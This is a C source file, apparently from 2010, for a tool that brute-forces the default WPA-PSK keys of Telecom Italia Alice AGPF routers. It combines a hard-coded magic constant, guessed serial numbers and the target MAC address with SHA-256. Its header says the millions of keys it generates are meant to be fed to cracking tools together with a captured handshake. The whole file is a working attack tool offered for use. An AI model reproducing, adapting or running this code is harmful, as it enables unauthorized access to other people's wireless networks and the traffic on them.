/*
 * alice_agpf_brute.c
 * 2010/10/02 v4.1
 *
 * Telecom Italia Alice AGPF WPA-PSK TMTO
 *             coded by mon@iwS
 *
 * usage: ./alice_agpf_brute [-q(uick)] [-t(Nthreads)] [-o outfile] [-p psk] <mac>
 *    eg: ./alice_agpf_brute -f -o test.lst 00:23:8E:15:A0:2D
 *        ./alice_agpf_brute -q -t4 -p 4xfod0gr5tzgy8s5bu5b93fd 00:25:53:2e:97:b9
 *
 * using a custom, stripped down version of sha2 library, this tool will
 * generate 8 millions PSKs for a given MAC address in a matter of seconds
 * (less than 7s on fast CPUs). you can put that list to a good use later,
 * with the help from tools like pyrit, cowpatty or ews on win32 and
 * a network handshake.
 *
 * "quick" mode computes up to 599.999 serials per serie, if not specified it'll
 * generate 999.999 psks for every serie
 *
 * can also test a psk against a list of serials
 *
 * 02/10: we now support multithreading ;)
 * 01/10: code revamp and features added
 * 26/09: bugfixes
 * 20/09: large speedup due to fast ints + new series + general recode
 */

#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

#include "sha256.h"

uint_fast8_t s[14];

inline uint_fast8_t *
sn(uint_fast8_t a, uint_fast32_t b, uint_fast8_t a2)
{
    uint_fast8_t *x = a2 == 0 ? "6790" : "6910";
    memcpy(s,x,4);
    s[4] = a ; s[5] = 'X' ; s[6] = '0';
    uint_fast8_t c = 0;
    for(c = 7; c < 13; c++) {
        s[13-(c-7)-1] = '0' + b % 10;
        b -= b % 10;
        b /= 10;
    }
    s[13] = 0;
    return s;
}

void
pskBrute(uint_fast8_t *mac, unsigned char *path,
         unsigned char *psk2, uint8_t quick)
{
    uint_fast8_t magic[32] = {
        0x64, 0xC6, 0xDD, 0xE3, 0xE5,
        0x79, 0xB6, 0xD9, 0x86, 0x96,
        0x8D, 0x34, 0x45, 0xD2, 0x3B,
        0x15, 0xCA, 0xAF, 0x12, 0x84,
        0x02, 0xAC, 0x56, 0x00, 0x05,
        0xCE, 0x20, 0x75, 0x91, 0x3F,
        0xDC, 0xE8
    };

    uint_fast8_t table[36] = "0123456789abcdefghijklmnopqrstuvwxyz";
    uint_fast8_t hash[32], psk[25]; psk[24] = 0;
    uint_fast32_t U = 0, Ul = quick == 1 ? 599999 : 999999;
    uint_fast8_t b, a2, K, n = 0xA;

    SHA256_CTX shaX;
    SHA256_Init(&shaX);
    SHA256_Update(&shaX,magic,32);
    SHA256_CTX sha;

    if(psk2 == NULL) {
        FILE *dizionario = fopen(path,"w+");
        for(U = 0; U < Ul; U++) {
          for(b = '1'; b <= '4'; b++) {
            for(a2 = 0; a2 <= 1; a2++) {
              memcpy(&sha,&shaX,sizeof(shaX));
              SHA256_Update(&sha,sn(b,U,a2),13);
              SHA256_Update(&sha,mac,6);
              SHA256_Final(hash,&sha);
              for(K = 0; K < 24; K++) psk[K] = table[hash[K]%36];
              fwrite(psk,24,1,dizionario);
              fputc(n,dizionario);
            }
          }
        }
        fflush(dizionario);
        fclose(dizionario);
        printf("done.\n");
    } else {
        for(U = 0; U < Ul; U++) {
          for(b = '1'; b <= '4'; b++) {
            for(a2 = 0; a2 <= 1; a2++) {
              memcpy(&sha,&shaX,sizeof(shaX));
              SHA256_Update(&sha,sn(b,U,a2),13);
              SHA256_Update(&sha,mac,6);
              SHA256_Final(hash,&sha);
              for(K = 0; K < 24; K++) psk[K] = table[hash[K]%36];
              if(strncmp(psk2, psk, 24) == 0) {
                printf("found: %s %s %02x:%02x:%02x:%02x:%02x:%02x\n",
                    sn(b,U,a2), psk, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
                return;
              }
            }
          }
        }
    printf("nothing found for %s. exiting.\n", psk);
    }

    return;
}

int main(int argc, char *argv[])
{

    unsigned char *path = NULL, *path2 = NULL, *psk = NULL;
     uint_fast8_t  mac[6];
          uint8_t  quick = 0;
             char  c;

    if(argc < 4) {
        fprintf(stderr, "usage: %s [-q] [-p psk] [-o outfile] <mac>\n", argv[0]);
        return -1;
    }

    while((c = getopt(argc, argv, ":qo:p:")) != -1)
        switch(c) {
            case 'q': quick = 1; break;
            case 'o': path = optarg;; break;
            case 'p': psk = optarg; break;
            case ':': break;
            case '?': break;
             default: abort();
        }

    for(; optind < argc; optind++)
        if(access(argv[optind], R_OK))
            if(sscanf(argv[optind], "%02x:%02x:%02x:%02x:%02x:%02x",
                &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]))
                    pskBrute(mac, path, psk, quick);
            else return -1;
    return 0;
}

